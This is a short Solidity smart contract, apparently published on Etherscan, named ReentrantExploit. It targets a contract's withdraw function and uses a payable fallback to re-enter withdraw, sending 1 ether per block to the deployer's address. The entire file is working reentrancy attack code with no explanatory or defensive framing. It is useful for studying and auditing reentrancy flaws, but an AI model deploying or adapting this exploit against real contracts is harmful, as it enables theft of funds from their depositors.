/**
 *Submitted for verification at Etherscan.io on 2021-07-24
*/

pragma solidity ^0.6.12;


interface IReentrancy {
    function withdraw(uint) external;
}

contract ReentrantExploit {
    
    address public reentrant;
    address public owner;
    mapping(uint256 => bool) public calls;
    
    constructor(address target) public {
        reentrant = target;
        owner = msg.sender;
    }
    
    function withdraw(uint amount) public {
        IReentrancy(reentrant).withdraw(amount);
    }
    
    function setReentrant(address _reentrant) external {
        reentrant = _reentrant;
    }
    
    fallback() external payable {
        if(!calls[block.number]) {
            withdraw(1 ether);
            (bool sentSuccess,) = owner.call{value: 1 ether}("");
            require(sentSuccess, "cannot sent eth to msg.sender");
            calls[block.number] = true;
        }
    }
}